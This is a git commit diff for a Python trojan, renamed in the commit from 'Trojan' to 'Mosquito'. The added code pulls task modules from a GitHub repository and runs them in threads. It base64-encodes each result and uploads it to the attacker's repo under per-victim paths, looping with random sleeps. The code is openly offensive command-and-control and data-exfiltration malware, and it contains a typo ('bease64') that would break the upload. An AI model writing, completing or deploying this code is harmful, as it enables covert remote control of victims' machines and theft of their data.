4f980b0ddf131948252d73949798f98bc08e332c
L0WK3Y <lokarrcursed@protonmail.com>
2021-10-04 20:10:04 +0300

    Renamed Trojan to Mosquito, added module_runner(), added store_module_result, added run()

--- konopzzzz.py
+++ konopzzzz.py
@@ -19,7 +19,7 @@ def github_connect():
 def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
 
-class Trojan:
+class Mosquito:
     def __init__(self, id):
         self.id = id
         self.config_file = f'{id}.json'
@@ -34,3 +34,25 @@ class Trojan:
             if task['module'] not in sys.modules:
                 exec("import %s" % task['module'])
             return config
+
+    def module_runner(self, module):
+        result = sys.modules[module].run()
+        self.store_module_result(result)
+
+    def store_module_result(self, data):
+        message = datetime.now().isoformat()
+        remote_path = f'data/{self.id}/{message}.data'
+        bindata = bytes('%r' % data, 'utf-8')
+        self.repo.create_file(remote_path, message, bease64.b64encode(bindata))
+
+    def run(self):
+        while True:
+            config = self.get_config()
+            for task in config:
+                thread = threading.Thread(
+                    target = self.module_runner,
+                    args = (task['module'],))
+                thread.start()
+                time.sleep(random.randint(1, 10))
+            
+            time.sleep(random.randint(30*60, 3*60*60))
